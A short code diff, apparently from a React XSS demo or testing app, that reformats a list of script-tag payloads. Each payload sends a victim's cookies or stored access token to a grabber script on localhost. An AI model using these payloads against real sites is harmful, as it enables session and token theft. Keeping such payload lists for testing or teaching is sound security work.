@@ -9,13 +9,15 @@ export default (props) => {
 			title: "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>"
 		},
 		{
-			title: "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>"
+			title:
+				"<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>"
 		},
 		{
 			title: "<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>"
 		},
 		{
-			title: "<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>"
+			title:
+				"<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>"
 		}
 	];
 	const BasicXSS = [
